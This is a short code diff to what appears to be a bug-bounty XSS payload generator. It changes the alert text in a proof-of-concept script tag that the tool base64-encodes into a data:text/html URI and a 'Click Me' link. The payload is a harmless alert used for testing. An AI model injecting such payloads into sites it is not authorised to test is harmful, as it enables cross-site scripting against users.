@@ -42,7 +42,7 @@ def payload(choice):
     if choice == 3:
         print('PoC Payload')
         print('_'*40)
-        poc = "<script>alert('OPENBOUNTY')</script>".encode('utf-8')
+        poc = "<script>alert('OPENBUGBOUNTY')</script>".encode('utf-8')
         b64String = Escape(base64.b64encode(poc))
         print('Your Payload : data:text/html;base64,{}'.format(b64String))
         print('Click Me Payload : <a href "data:text/html;base64,{}">Click Me</a>'.format(b64String))
